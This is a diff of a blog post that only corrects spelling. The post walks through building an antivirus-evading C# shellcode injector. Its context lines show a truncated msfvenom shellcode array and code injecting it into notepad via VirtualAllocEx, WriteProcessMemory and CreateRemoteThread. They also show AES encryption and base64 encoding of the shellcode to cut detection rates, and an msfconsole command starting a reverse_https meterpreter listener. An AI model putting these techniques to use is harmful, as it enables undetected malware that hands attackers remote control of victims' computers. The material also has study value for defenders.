@@ -30,7 +30,7 @@ The shell code was created with msfvenom and sits inside the main function in th
 byte[] buf = new byte[685] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 }
 ```
 
-The code, then uses GetprocessesByName and retrives an array of process components. The OpenProcess function, then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the type of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shell code contained inside the buf byte array, into the allocated memory. CreateRemoteThread, then creates a thread that runs in notepads virtual address space, executing the shell code.
+The code then uses GetprocessesByName and retrieves an array of process components. The OpenProcess function then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the type of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shell code contained inside the buf byte array, into the allocated memory. CreateRemoteThread, then creates a thread that runs in notepad's virtual address space, executing the shell code.
 
 ```csharp
 Process processName = Process.GetProcessesByName("notepad")[0];
@@ -119,7 +119,7 @@ def cipher_create(key,shellcode,IV):
 
 ## Encoding Our Encrypted Data
 
-The final part of the script, will encode the three arguments passed from the aes_encrypt_shellcode() function. The function simply uses the base64.b64encode() function, with our chosen data as an argument and a variable name for the returning encoded data, that is then printed to the linux terminal.
+The final part of the script will encode the three arguments passed from the aes_encrypt_shellcode() function. The function simply uses the base64.b64encode() function, with our chosen data as an argument and a variable name for the returning encoded data, that is then printed to the linux terminal.
 
 ```python
 def base64_encode(encrypted_data, IV, key):
@@ -227,7 +227,7 @@ Uploading the new C# injector, we see that the detection rate has dropped signif
 
 ## Getting A Shell On The Target Machine
 
-To test that the InjectAes.exe functions correctly, we first set up a msfconsole listener on Kali linux, with the following command. The listener will wait for the incoming connection, from shell code that was executed on the target machine (The C# Process Injecton).
+To test that the InjectAes.exe functions correctly, we first set up a msfconsole listener on Kali Linux, with the following command. The listener will wait for the incoming connection, from shell code that was executed on the target machine (The C# Process Injection).
 
 ```
 sudo msfconsole -q -x "use exploit/multi/handler/; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST eth0; set LPORT 443; run
